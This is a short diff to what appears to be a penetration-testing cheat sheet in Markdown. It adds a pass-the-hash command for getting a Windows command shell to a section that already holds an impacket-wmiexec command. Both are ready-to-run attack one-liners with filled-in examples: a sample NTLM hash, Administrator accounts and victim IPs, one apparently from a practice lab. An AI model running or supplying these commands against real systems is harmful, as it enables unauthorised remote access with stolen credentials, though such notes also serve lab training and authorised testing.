@@ -200,6 +200,8 @@ Requires (all conditions rather common):
 However, u usually also require local admin rights on target machine.
 
 run this on kali:  `/usr/bin/impacket-wmiexec -hashes :<compromised hash> <compromised user>@<victim ip>` (eg `/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73` )
+
+run this also if the above don't work: `pth-winexe -U <domain>/<user> //<victim ip> cmd.exe` (eg `pth-winexe -U jeeves/Administrator //10.10.10.63 cmd.exe`)
 </details>
 
 ## Lateral Movement
